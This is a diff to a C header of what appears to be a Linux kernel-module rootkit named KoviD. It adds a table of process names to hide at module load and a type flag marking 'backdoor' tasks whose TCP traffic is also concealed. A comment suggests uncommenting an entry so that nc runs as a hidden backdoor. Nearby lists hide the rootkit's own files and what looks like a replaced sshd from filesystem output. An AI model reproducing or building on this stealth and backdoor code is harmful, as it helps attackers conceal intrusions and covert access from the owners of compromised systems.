@@ -160,15 +160,6 @@ char *kv_util_random_AZ_string(size_t);
 /** VM operations */
 unsigned long kv_get_elf_vm_start(pid_t);
 
- /*
-  * Hide these process names during load
-  * children included
- */
-static const char *kv_hide_ps_on_load[] = {
-    "whitenose", "pinknose", "rednose", "blacknose",
-    "greynose", "purplenose", "bluenose", NULL
-};
-
 /*
  * Hide these names from write() fs output
  */
@@ -176,6 +167,50 @@ static const char *kv_hide_str_on_load[] = {
     ".kovid", "kovid", "kovid.ko", ".kv.ko",
     ".lm.sh", ".sshd_orig", NULL
 };
+
+enum {
+    KV_TASK,
+    /* The following indicates a backdoor
+     * task that can also hide its
+     * tcp traffic
+     */
+    KV_TASK_BD
+};
+
+struct _kv_hide_ps_on_load {
+    const char *name;
+    int type;
+} ;
+
+ /*
+  * Hide these process names at insmod
+ */
+static struct _kv_hide_ps_on_load kv_hide_ps_on_load[] = {
+    {"whitenose-example", KV_TASK},
+    {"pinknose-example", KV_TASK},
+    {"rednose-example", KV_TASK},
+    {"blacknose-example", KV_TASK},
+    {"greynose-example", KV_TASK},
+    {"purplenose-example", KV_TASK},
+
+    // Uncomment, recompile and try nc:
+    //{"nc", KV_TASK_BD},
+
+    {NULL, -1},
+};
+
+static inline const char **kv_get_hide_ps_names(void) {
+    static const char *n[256];
+    int i;
+    if (!*n) {
+        // hard break on 256 entries
+        for (i = 0; kv_hide_ps_on_load[i].name != NULL
+                && i < 256; ++i) {
+            n[i] = kv_hide_ps_on_load[i].name;
+        }
+    }
+    return n;
+}
 
 
 // PP_NARG from
